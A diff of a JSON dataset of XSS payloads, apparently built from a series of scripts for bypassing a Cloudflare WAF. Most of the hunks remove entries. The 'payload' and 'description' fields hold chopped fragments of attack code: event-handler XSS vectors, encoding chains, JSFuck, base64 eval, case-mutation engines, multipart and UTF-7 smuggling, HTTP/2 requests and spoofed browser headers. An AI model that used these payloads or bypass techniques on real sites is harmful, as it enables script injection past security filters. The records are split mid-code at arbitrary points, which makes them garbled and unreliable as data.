-      "payload": "=\" * 70 + \"\n\")\n\nencoding_tests = {\n    # Unicode escape for angle brackets\n    \"unicode-lt-gt\": '\\u003csvg/oni=on onload=alert(1)\\u003e',\n    # Raw URL with known bypass (no encoding by requests)\n    \"raw-svg-oni\": None,  # tested separately\n    # HTML entity for /\n    \"entity-slash\": '<svg&#47;oni=on onload=alert(1)>',\n    # Mixed encoding\n    \"mixed-enc-svg\": '<%73%76%67/oni=on onload=alert(1)>',\n    # Tab between attributes\n    \"tab-attrs\": '<svg\toni=on\tonload=alert(1)>',\n    # Vertical tab\n    \"vtab-attrs\": '<svg\\x0boni=on\\x0bonload=alert(1)>',\n    # Form feed\n    \"ff-attrs\": '<svg\\x0coni=on\\x0conload=alert(1)>',\n    # Multiple encoding of known bypass\n    \"double-enc-svg\": '%253Csvg/oni%253Don%20onload%253Dalert(1)%253E',\n    # Entity-encoded tag name\n    \"entity-tag\": '&#60;svg/oni=on onload=alert(1)&#62;',\n    # Backslash before attribute\n    \"backslash-attr\": '<svg\\\\/oni=on onload=alert(1)>',\n}\n\nfor name, payload in encoding_tests.items():\n    if payload is None:\n        continue\n    b, r, p = test(name, \"globalHtml\", payload)\n    if r: bypasses.append((\"ENC\", name, payload))\n    elif p: partials.append((\"ENC\", name, payload))\n\n# Test raw URL (bypass requests library URL encoding)\nraw_test_url = BASE + \"?globalHtml=%3Csvg/oni=on%20onload=alert(1)%3E\"\nb, r, p = test(\"raw-url-svg-oni",
-      "description": "globalHtml\", \"\", raw_url=raw_test_url)\nif r: bypasses.append((\"RAW\", \"raw-url-svg-oni\", raw_test_url))\nelif p: partials.append((\"RAW\", \"raw-url-svg-oni\", raw_test_url))\n\n# More raw URL tests with known bypasses\nraw_tests = {\n    \"raw-svg-Only\": BASE + \"?globalHtml=%3CSvg%20Only=1%20OnLoad=confirm(1)%3E\",\n    \"raw-svg-on-space\": BASE + \"?globalHtml=%3Csvg%20on%20onload=(alert)(document.domain)%3E\",\n    \"raw-svg-oni-slash\": BASE + \"?globalHtml=%3Csvg/oni=on%20onload=confirm(2)%3E\",\n    \"raw-svg-optional\": BASE + \"?globalHtml=%3Csvg%20onx=()%20onload=window.alert?.()%3E\",\n    \"raw-img-ignored\": BASE + \"?globalHtml=%3Cimg%20ignored=()%20src=x%20onerror=prompt(1)%3E\",\n    \"raw-a-onclick\": BASE + '?globalHtml=%3Ca\"/onclick=(confirm)()%3EClick%20Here!',\n    \"raw-svg-on-tab\": BASE + \"?globalHtml=%3Csvg%09on%09onload=alert(1)%3E\",\n    \"raw-svg-on-lf\": BASE + \"?globalHtml=%3Csvg%0Aon%0Aonload=alert(1)%3E\",\n    \"raw-svg-percent-on\": BASE + \"?globalHtml=%3Csvg%2Fon%20onload=alert(1)%3E\",\n}\n\nfor name, url in raw_tests.items():\n    b, r, p = test(name, \"globalHtml\", \"\", raw_url=url)\n    if r: bypasses.append((\"RAW\", name, url))\n    elif p: partials.append((\"RAW\", name, url))\n\n# ════════════════════════════════════════════════════════════════════════════\n# SECTION 5: Attribute context with hash fragment (for onfocus+autofocus)\n# ════════════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"SECTION 5: Attribute Breakout with Fragment Targeting",
-      "technique": "direct_injection",
-      "source_file": "waf_round4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0501",
       "category": "xss",
       "subcategory": "svg_based",
@@ -2167,20 +1803,6 @@
       "description": "svg-onload-print-POST\": '<svg/onload=print()>',\n    \"img-onerror-print\": '<img src=x onerror=print()>',\n    \"input-onfocus-print\": '<input onfocus=print() autofocus>',\n    \"body-onload-print\": '<body onload=print()>',\n    \"details-ontoggle-print\": '<details open ontoggle=print()>',\n    \n    # Gap events + print() on tags\n    \"svg-on{load-print\": '<svg on{load=print()>',\n    \"img-on{error-print\": '<img src=x on{error=print()>',\n    \"input-on{focus-print\": '<input on{focus=print() autofocus>',\n    \n    # Self-close + gap + print\n    \"sc-svg-on{load-print\": '\"/><svg on{load=print()>',\n    \"sc-img-on{error-print\": '\"/><img src=x on{error=print()>',\n    \"sc-input-on{focus-print\": '\"/><input on{focus=print() autofocus>',\n}\n\nfor name, payload in global_print.items():\n    if \"sc-\" in name:\n        param = \"attributeHtml\"\n    else:\n        param = \"globalHtml\"\n    \n    # POST\n    try:\n        r = requests.post(BASE, data={param: payload},\n                         verify=False, timeout=TIMEOUT)\n        blocked = r.status_code in (403, 406, 503)\n        reflected = False\n        if not blocked:\n            lower = r.text.lower()\n            reflected = ('onload=print' in lower or 'onerror=print' in lower or \n                        'onfocus=print' in lower or 'on{load=print' in lower or\n                        'on{error=print' in lower or 'on{focus=print' in lower)\n        mark = \" *** REFLECTED ***\" if reflected else \" PASS\" if not blocked else \" BLOCK\"\n        if reflected: found.append(f\"POST-{name}",
       "technique": "direct_injection",
       "source_file": "waf_round45_print_verify.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0509",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "=\" * 80)\nprint(\"ROUND 69: ADDITIONAL 1000+ PAYLOADS\")\nprint(\"=\" * 80)\n\n# ════════════════════════════════════════════════════════════════════\nprint(f\"\n--- 69A: Raw Binary Body Payloads ---\")\n\nXSS_RAW = b'<svg/onload=alert(1)>'\nXSS_IMG = b'<img src=x onerror=alert(1)>'\n\nfor xss in [XSS_RAW, XSS_IMG]:\n    # Raw bytes in body\n    post(b\"globalHtml=\" + xss)\n    # URL-encoded raw\n    post(b\"globalHtml=\" + urllib.parse.quote_from_bytes(xss).encode())\n    # Base64 in body\n    post(b\"globalHtml=\" + base64.b64encode(xss))\n    # Hex string\n    post(b\"globalHtml=\" + xss.hex().encode())\n    # Reversed\n    post(b\"globalHtml=\" + xss[::-1])\n    # ROT13 (letters only)\n    import codecs\n    post(b\"globalHtml=\" + codecs.encode(xss.decode(), 'rot_13').encode())\n    # XOR with key\n    post(b\"globalHtml=\" + bytes(b ^ 0x41 for b in xss).hex().encode())\n    # Null-byte interleaved  \n    post(b\"globalHtml=\" + b''.join(bytes([b, 0]) for b in xss))\n    # UTF-16LE encoded\n    post(b\"globalHtml=\" + xss.decode().encode('utf-16-le'))\n    # UTF-16BE encoded  \n    post(b\"globalHtml=\" + xss.decode().encode('utf-16-be'))\n\nprint(f\"  69A done: {total} total\")\n\n\n# ════════════════════════════════════════════════════════════════════\nprint(f\"\n--- 69B: Encoding Chains ---\")\n\nbase_payloads = [\n    '<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '\" onfocus=alert(1) autofocus x=\"',\n    '<script>alert(1)</script>',\n    '\"><svg/onload=alert(1)>',\n]\n\nfor p in base_payloads:\n    enc = urllib.parse.quote(p)\n    b64 = base64.b64encode(p.encode()).decode()\n    b64enc = urllib.parse.quote(b64)\n    dblenc = urllib.parse.quote(enc)\n    trienc = urllib.parse.quote(dblenc)\n    htmlent = ''.join(f'&#{ord(c)};' for c in p)\n    hexent = ''.join(f'&#x{ord(c):x};' for c in p)\n    \n    # URL(HTML(payload))\n    post(f\"globalHtml={urllib.parse.quote(htmlent)}",
-      "technique": "encoding",
-      "source_file": "waf_round69_mass2.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -2230,40 +1852,12 @@
       "blocked": true
     },
     {
-      "id": "xss-0521",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\\\\x63\\\\x6f\\\\x6e\\\\x73\\\\x74\\\\x72\\\\x75\\\\x63\\\\x74\\\\x6f\\\\x72\"](\"alert(1)\")()>',\n]\n\nfor p in F5:\n    test(p)\nprint(f\"  F5 done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- D: AWS/ModSecurity/Sucuri/Generic WAF Bypasses ---\")\n\nGENERIC = [\n    # AWS WAF: tag fuzzing\n    '<svg/onload=alert(1)>",
-      "description": "<SVG/ONLOAD=alert(1)>',\n    '<sVg/oNlOaD=alert(1)>', '<Svg/OnLoad=alert(1)>',\n    # ModSecurity: path confusion\n    '<img src=x onerror=alert(1)>', '<IMG SRC=x ONERROR=alert(1)>',\n    # ModSecurity: JS context breakout\n    \"';alert(1)//\", '\";alert(1)//', '`${alert(1)}`',\n    \"\\\\';alert(1)//\", '\\\\\"};alert(1)//',\n    # Sucuri: comment bypass\n    '<!--><img src=x onerror=alert(1)>-->', '/*--><img src=x onerror=alert(1)>',\n    # Barracuda: encoding chain\n    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',\n    '<img src=x onerror=\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074(1)>',\n    # Fortinet: double encode\n    '%253Csvg%2520onload%253Dalert(1)%253E',\n    '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',\n    # Generic: JSFuck-style\n    '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()()',\n]\n\nfor p in GENERIC:\n    test(p)\nprint(f\"  Generic WAF done: {total} total",
-      "technique": "encoding",
-      "source_file": "waf_round75_cross_waf.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0525",
       "category": "xss",
       "subcategory": "svg_based",
       "payload": "...'))\n    p1 = f\"eval(atob('{b64}'))\"\n    get(p1)\n    post(p1)\n    b64_count += 2\n    \n    # 3. In script tag: <script>eval(atob('...'))</script>\n    p2 = f\"<script>eval(atob('{b64}'))</script>\"\n    get(p2)\n    post(p2)\n    b64_count += 2\n    \n    # 4. In event handler: <img src=x onerror=eval(atob('...'))>\n    p3 = f\"<img src=x onerror=eval(atob('{b64}'))>\"\n    get(p3)\n    post(p3)\n    b64_count += 2\n    \n    # 5. In SVG: <svg/onload=eval(atob('...'))>\n    p4 = f\"<svg/onload=eval(atob('{b64}'))>\"\n    get(p4)\n    post(p4)\n    b64_count += 2\n    \n    # 6. Function constructor with base64\n    p5 = f\"[]['filter']['constructor']('eval(atob(\\\\'{b64}\\\\'))')();\"\n    get(p5)\n    post(p5)\n    b64_count += 2\n    \n    # 7. document.write with base64\n    p6 = f\"document.write(atob('{b64}'))\"\n    get(p6)\n    post(p6)\n    b64_count += 2\n    \n    # 8. <img src=x onerror=\"new Function(atob('...'))()\">\n    p7 = f'<img src=x onerror=\"new Function(atob(\\'{b64}\\'))()\">'\n    get(p7)\n    post(p7)\n    b64_count += 2\n    \n    # 9. Self-decoding data URI\n    p8 = f'<iframe src=\"data:text/html;base64,{b64}\">'\n    get(p8)\n    post(p8)\n    b64_count += 2\n    \n    # 10. Script src with data URI\n    p9 = f'<script src=\"data:text/javascript;base64,{b64}\"></script>'\n    get(p9)\n    post(p9)\n    b64_count += 2\n    \n    # 11. atob with template literal\n    p10 = f\"<svg/onload=eval(atob`{b64}`)>\"\n    get(p10)\n    post(p10)\n    b64_count += 2\n    \n    # 12. Base64 inside JSON body\n    body = json.dumps({\"globalHtml\": f\"<script>eval(atob('{b64}'))</script>\"}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"Content-Type: application/json\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + body)\n    b64_count += 1\n\nprint(f\"  Base64 done: {b64_count} payloads, {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- F: Scrapling-Style Stealth Headers ---\")\n\nUSER_AGENTS = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
       "description": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15\",\n    \"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\",\n    \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1\",\n]\n\nSEC_CH_UA = [\n    '\"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\", \"Not-A.Brand\";v=\"99\"',\n    '\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"',\n    '\"Firefox\";v=\"121\"',\n]\n\nSTEALTH_PAYLOADS = [\n    '<svg/onload=alert(1)>',\n    '<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<Img/Src/OnError=(alert)(1)>',\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n    '<svg onx=() onload=window.alert?.()>',\n    '<img hrEF=\"x\" sRC=\"data:x,\" oNLy=1 oNErrOR=prompt`1`>',\n    '<!--><svg+onload=top[/al/.source+/ert/.source](1)>',\n    '<details/open/ontoggle=\"self[\\'ale\\'+\\'rt\\",
       "technique": "direct_injection",
-      "source_file": "waf_round75_cross_waf.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0527",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "{ m_enc}\"][\"{c_enc}\"](\"{a_enc}\")()'\n        get(p)\n        post(p)\n\n        # In HTML context\n        p2 = f'<img src=x onerror=[][\"{ m_enc}\"][\"{c_enc}\"](\"{a_enc}\")()>'\n        get(p2)\n        post(p2)\n\nprint(f\"  Octal/hex/unicode done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- H: Cross-WAF Mutation Engine (500+) ---\")\n\nCROSS_WAF_BASES = [\n    # Akamai-style\n    '<!--><svg+onload=top[/al/.source+/ert/.source](1)>',\n    # Imperva-style\n    \"<details/open/ontoggle=\\\"self['ale'+'rt'](1)\\\">\",\n    # F5-style\n    '<img src=x onerror=[][\"filter\"][\"constructor\"](\"alert(1)\")()>',\n    # Shad0wH3x-style\n    '<img oNLy=1 src=x OnErRoR=alert(1)//>',\n    # HexaPhp-style\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n    # KN0X55-style\n    '<Img/Src/OnError=(alert)(1)>',\n    # Brutelogic optional chaining\n    '<svg onx=() onload=window.alert?.()>',\n    # Base64 in event\n    '<svg/onload=eval(atob(\"YWxlcnQoMSk=\"))>',\n    # Template literal\n    '<svg/onload=alert`1`>',\n    # toString trick\n    '<svg/onload=top[8680..toString(36)](1)>',\n]\n\nMUTATIONS = []\nfor base in CROSS_WAF_BASES:\n    MUTATIONS.append(base)\n    MUTATIONS.append(base.upper())\n    MUTATIONS.append(base.lower())\n    MUTATIONS.append(base.swapcase())\n    \n    # Random case x3\n    for _ in range(3):\n        v = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in base)\n        MUTATIONS.append(v)\n    \n    # Tab/newline substitution\n    MUTATIONS.append(base.replace(' ",
-      "description": "\\t', 1))\n    MUTATIONS.append(base.replace(' ', '\\n', 1))\n    MUTATIONS.append(base.replace(' ', '\\r\\n', 1))\n    \n    # Slash separator\n    MUTATIONS.append(base.replace(' ', '/', 1))\n    MUTATIONS.append(base.replace(' ', '//', 1))\n    \n    # Null byte\n    MUTATIONS.append(base.replace('=', '\\x00=', 1))\n    \n    # Entity encode parens\n    MUTATIONS.append(base.replace('(', '&#40;",
-      "technique": "encoding",
       "source_file": "waf_round75_cross_waf.py",
       "tested_against": [
         "cloudflare_waf"
@@ -2342,20 +1936,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0598",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": ":authority', HOST),\n            ('cookie', f'globalHtml={urllib.parse.quote(p, safe=\"\")}'),\n        ]\n        h2_req(headers, label=\"h2-cookie\")\n\n    print(f\"  HTTP/2 deep done: {total} total\")\n\nexcept Exception as e:\n    print(f\"  HTTP/2 error: {e}, {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- B: Extended Grammar Fuzzing ---\")\n\n# B1: Multipart nested boundaries\nfor xss in [XSS_S, XSS_I]:\n    # Nested multipart (multipart inside multipart)\n    inner_bound = \"innerbound\"\n    outer_bound = \"outerbound\"\n    inner_body = (\n        f\"--{inner_bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n\"\n        f\"{xss}\r\n\"\n        f\"--{inner_bound}--\r\n\"\n    )\n    outer_body = (\n        f\"--{outer_bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"part1\\\"\r\n\"\n        f\"Content-Type: multipart/mixed; boundary={inner_bound}\r\n\r\n\"\n        f\"{inner_body}\r\n\"\n        f\"--{outer_bound}--\r\n\"\n    ).encode()\n    post_raw(outer_body, ct=f\"multipart/form-data; boundary={outer_bound}\", label=\"nested-multipart\")\n\n    # Multipart with charset in Content-Type body part\n    bound = \"csbound\"\n    body = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\"\n        f\"Content-Type: text/plain; charset=utf-7\r\n\r\n\"\n        f\"+ADw-svg/onload+AD0-alert(1)+AD4-\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode()\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"multipart-utf7\")\n\n    # Multipart with Content-Transfer-Encoding: base64\n    bound = \"b64bound\"\n    b64_xss = base64.b64encode(xss.encode()).decode()\n    body = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\"\n        f\"Content-Transfer-Encoding: base64\r\n\r\n\"\n        f\"{b64_xss}\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode()\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"multipart-b64\")\n\n    # Multipart with quoted-printable encoding\n    bound = \"qpbound\"\n    qp_xss = ''.join(f'={ord(c):02X}' for c in xss)\n    body = (\n        f\"--{bound}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\"\n        f\"Content-Transfer-Encoding: quoted-printable\r\n\r\n\"\n        f\"{qp_xss}\r\n\"\n        f\"--{bound}--\r\n\"\n    ).encode()\n    post_raw(body, ct=f\"multipart/form-data; boundary={bound}\", label=\"multipart-qp\")\n\n# B2: JSON deep edge cases\nfor xss in [XSS_S, XSS_I]:\n    escaped_xss = xss.replace('\"",
-      "description": "\\\\\"",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0599",
       "category": "xss",
       "subcategory": "svg_based",
@@ -2389,20 +1969,6 @@
       "subcategory": "svg_based",
       "payload": "content-length',str(len(jbody)))], body=jbody, label=\"h2-ext-json\")\n\n    # H2 with func variants in event handlers\n    for func in FUNCS:\n        p = f'<svg/onload={func}>'\n        enc = urllib.parse.quote(p, safe='')\n        h2_req([(':method",
       "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0617",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": ":authority',HOST)], label=\"h2-path\")\n\n    print(f\"  H2 remaining done: {total} total\")\nexcept Exception as e:\n    print(f\"  H2 error: {e}, {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- B: POST+JSON Tag×Func Matrix ---\")\n\nTAGS_POST = [\n    ('<svg/onload=",
-      "description": ">",
       "technique": "direct_injection",
       "source_file": "waf_round90_final.py",
       "tested_against": [
